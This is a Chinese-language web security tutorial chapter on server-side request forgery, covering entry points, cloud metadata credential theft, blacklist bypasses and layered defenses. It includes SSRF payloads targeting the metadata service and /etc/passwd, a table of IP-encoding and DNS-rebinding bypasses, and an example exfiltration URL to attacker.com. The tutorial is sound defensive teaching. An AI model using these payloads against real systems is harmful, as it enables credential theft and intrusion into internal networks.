---
title: "SSRF：让服务器替攻击者发请求"
description: "云环境里 SSRF 常常直接等于凭据泄露——元数据服务为什么是首要目标、为什么「黑名单过滤内网 IP」必然被绕过、以及唯一可靠的解法：出网代理 + 网络隔离。"
source: "https://daiw.org/manual/web-security/ssrf"
---

# SSRF：让服务器替攻击者发请求

云环境里 SSRF 常常直接等于凭据泄露——元数据服务为什么是首要目标、为什么「黑名单过滤内网 IP」必然被绕过、以及唯一可靠的解法：出网代理 + 网络隔离。

SSRF（服务端请求伪造）是指：**你的服务器按攻击者提供的地址发起了一个请求。**

单独看好像不严重——「不就是帮他访问个网页吗」。但你的服务器所处的**网络位置**是攻击者到不了的：它在内网里、它有云凭据、它能连数据库。**SSRF 的价值就在于借用这个位置。**

## 典型入口

任何「接收 URL 然后去访问它」的功能：

| 功能 | 例子 |
| --- | --- |
| 从 URL 导入图片/文件 | 头像设置里的「从网址导入」 |
| 网页预览 / 抓取标题 | 聊天工具里粘贴链接自动显示卡片 |
| Webhook 回调 | 用户配置「事件发生时通知这个地址」 |
| 文档转换 | HTML 转 PDF（渲染器会加载外部资源！） |
| 导入/同步 | 从用户提供的 RSS/API 地址拉数据 |
| SSO / OIDC 配置 | 用户可控的 issuer / jwks_uri |

::: warning
**HTML 转 PDF 是最容易被忽略的一个。** 你只是让用户提交一段 HTML 生成发票，但渲染引擎（headless 浏览器、wkhtmltopdf）会**忠实地加载里面的所有外部资源**：

  ```html
  <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  <iframe src="file:///etc/passwd"></iframe>
  ```

攻击者甚至不需要你的接口接收 URL——他提交的 HTML 内容本身就是 SSRF 载荷。**任何服务端渲染用户提供内容的场景，都要当作 SSRF 面来对待。**
:::

## 为什么在云上后果特别严重

云服务器上有一个**链路本地地址**提供实例元数据：

```
http://169.254.169.254/
```

它不需要任何认证——**因为设计假设是「只有实例自己能访问它」**。而 SSRF 恰恰打破了这个假设。

```bash
# AWS IMDSv1（老版本，无防护）
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# → 返回临时 AccessKey / SecretKey / Token
```

**拿到这组凭据，攻击者就以你的服务器角色身份进入了你的云账号。** 能干什么取决于那个角色的权限——如果权限过大（这非常常见），就是整个云环境沦陷。

历史上多起大规模数据泄露事件的核心链路就是 **SSRF → 元数据服务 → 云凭据 → 拖走存储桶**。

**对策**（云侧）：

```bash
# AWS：强制 IMDSv2（要求先 PUT 拿 token，简单的 GET 型 SSRF 就打不到了）
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

`hop-limit 1` 很关键：**它让容器里的进程无法访问元数据服务**（多一跳就超限），能挡住容器化应用里的 SSRF。

其它云厂商有对应机制（要求特定请求头等），原理相同：**让「简单的 GET」不足以拿到凭据**。

## 为什么黑名单必然被绕过

最常见的错误防御：

```javascript
// ❌ 看起来挡住了内网
const BLOCKED = ['127.0.0.1', 'localhost', '169.254.169.254', '10.', '192.168.'];
if (BLOCKED.some(b => url.includes(b))) throw new Error('blocked');
```

绕过方式多到列不完：

| 手法 | 例子 |
| --- | --- |
| 十进制 IP | `http://2130706433/` = 127.0.0.1 |
| 八进制 / 十六进制 | `http://0177.0.0.1/`、`http://0x7f000001/` |
| 简写 | `http://127.1/`、`http://0/` |
| IPv6 | `http://[::1]/`、`http://[::ffff:127.0.0.1]/` |
| **DNS 指向内网** | 攻击者自己的域名 `evil.com` 解析到 `127.0.0.1` |
| **DNS Rebinding** | 第一次解析返回外网 IP（通过校验），第二次解析返回内网 IP（实际请求） |
| 重定向 | 外网地址返回 302 跳到内网 |
| 其它协议 | `file:///etc/passwd`、`gopher://`、`dict://` |
| URL 解析差异 | `http://expected.com@evil.com/`、`http://evil.com#expected.com` |

::: warning
**DNS Rebinding 能击穿「先解析再校验」的防御**，这是最需要理解的一种：

  ```
  1. 你的代码解析 evil.com → 得到 1.2.3.4（公网），校验通过
  2. 你的 HTTP 客户端发起请求，再次解析 evil.com → 这次返回 127.0.0.1
  3. 请求打到了本机
  ```

攻击者控制 DNS 服务器，把 TTL 设成 0，两次解析返回不同结果。**「校验」和「使用」之间的时间差就是漏洞**（TOCTOU）。

要防住它，必须**校验后直接连那个 IP**，而不是把域名再交给 HTTP 客户端去解析。
:::

## 可靠的防御

### 第一层：白名单（能用就用）

如果业务场景允许，**只允许访问预先约定的域名**：

```javascript
const ALLOWED_HOSTS = new Set(['api.partner.com', 'cdn.trusted.com']);
const parsed = new URL(userUrl);
if (!ALLOWED_HOSTS.has(parsed.hostname)) throw new Error('host not allowed');
if (parsed.protocol !== 'https:') throw new Error('https only');
```

**大多数 Webhook、集成场景其实可以白名单**——用户配的是固定几家服务。先问「真的需要任意 URL 吗」。

### 第二层：解析后校验 + 锁定 IP

必须支持任意 URL 时（比如网页预览），流程要这样：

```javascript
import dns from 'node:dns/promises';
import net from 'node:net';

function isPrivateIp(ip) {
  if (net.isIPv4(ip)) {
    const p = ip.split('.').map(Number);
    return p[0] === 10                                    // 10.0.0.0/8
      || (p[0] === 172 && p[1] >= 16 && p[1] <= 31)       // 172.16.0.0/12
      || (p[0] === 192 && p[1] === 168)                   // 192.168.0.0/16
      || p[0] === 127                                     // 环回
      || (p[0] === 169 && p[1] === 254)                   // 链路本地（含元数据服务）
      || p[0] === 0 || p[0] >= 224;                       // 保留 / 组播
  }
  // IPv6：环回、唯一本地地址、链路本地、IPv4 映射
  const s = ip.toLowerCase();
  return s === '::1' || s.startsWith('fc') || s.startsWith('fd')
      || s.startsWith('fe80') || s.startsWith('::ffff:');
}

async function safeFetch(userUrl) {
  const u = new URL(userUrl);
  if (!['http:', 'https:'].includes(u.protocol)) throw new Error('protocol');

  // 解析出所有 IP，任何一个是内网都拒绝
  const records = await dns.lookup(u.hostname, { all: true });
  for (const { address } of records) {
    if (isPrivateIp(address)) throw new Error('private ip');
  }

  // 关键：连刚才校验过的那个 IP，不给 DNS rebinding 机会
  const ip = records[0].address;
  return fetch(`${u.protocol}//${ip}${u.pathname}${u.search}`, {
    headers: { Host: u.hostname },      // 保留 Host 头，虚拟主机才认得
    redirect: 'manual',                 // ← 重定向必须自己处理
    signal: AbortSignal.timeout(5000),
  });
}
```

**三个要点**：

1. **协议白名单**——挡掉 `file:`、`gopher:` 等。
2. **解析出的每一个 IP 都要查**（一个域名可能有多条 A 记录）。
3. **`redirect: 'manual'`**——自动跟随重定向会绕过你所有校验。要跟随的话，**每一跳都重新走一遍上面的流程**。

::: info
上面这段代码能防住大部分情况，但**它很长、很容易写漏一处**——比如忘了处理重定向、漏了某个保留网段、IPv6 判断不全。

这正是下面第三层存在的理由：**与其在应用层反复自证正确，不如在网络层一次性解决。**
:::

### 第三层：网络隔离（最可靠）

**让「能不能访问内网」不再由应用代码决定，而由网络决定。**

方案 A：**把外呼流量走一个受限的出网代理**。

```javascript
// 应用只能通过代理出网，代理上做白名单/黑名单
const agent = new HttpsProxyAgent('http://egress-proxy.internal:3128');
fetch(url, { agent });
```

代理（Squid 之类）上配置：禁止访问内网段、禁止访问元数据地址、只允许 80/443、记录全部访问日志。**规则集中在一处，比散落在每个调用点可靠得多。**

方案 B：**用网络策略隔离**。

把「需要外呼」的服务放进一个独立的网段/命名空间，**用防火墙或 Kubernetes NetworkPolicy 禁止它访问内网**：

```yaml
# 只允许出到公网，禁止内网段与元数据地址
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-internal-egress
spec:
  podSelector:
    matchLabels: { role: url-fetcher }
  policyTypes: [Egress]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
              - 169.254.0.0/16      # 元数据服务
```

**这一层的好处是：即使应用代码有漏洞，请求也出不去。** 这才是纵深防御该有的样子。

## 盲 SSRF 也有价值

即使响应内容不回显给攻击者，SSRF 依然可用：

- **内网端口扫描**：通过响应时间/错误差异判断端口是否开放
- **触发内网服务的副作用**：很多内部服务是无认证的（Redis、Elasticsearch、内部管理接口），一个 GET/POST 就能造成破坏
- **外带数据**：让服务器请求 `http://attacker.com/?data=<某些信息>`

所以**「不回显就不用管」是错的**，和盲注同理。

## 排查

```bash
# 找出所有接收 URL 的地方
grep -rnE "fetch\(|axios\(|axios\.(get|post)|request\(|got\(|urllib|requests\.(get|post)" src/ \
  | grep -iE "req\.|params|query|body|input|url"

# 找 HTML/PDF 渲染
grep -rnE "puppeteer|playwright|wkhtmltopdf|weasyprint|imagemagick|convert " src/
```

## 小结

- SSRF 的价值在于**借用服务器的网络位置**，不在于「帮忙访问网页」。
- **云元数据服务（169.254.169.254）是首要目标**，SSRF → 云凭据 → 整个账号沦陷是真实存在的链路；**强制 IMDSv2 并把 hop-limit 设为 1**。
- **黑名单必然被绕过**（进制变换、DNS 指向内网、DNS rebinding、重定向、协议切换）。
- 应用层防御要点：**协议白名单、校验所有解析出的 IP、连校验过的那个 IP、手动处理重定向**。
- **最可靠的是网络层隔离**：出网代理或 NetworkPolicy——让应用代码有洞也出不去。
- HTML 转 PDF 是最容易被忽略的 SSRF 入口。
- **盲 SSRF 同样有价值**，不回显不等于没危害。

下一章讲另一个高危入口。👉 [文件上传](/manual/computer-programming/web-security/file-upload)
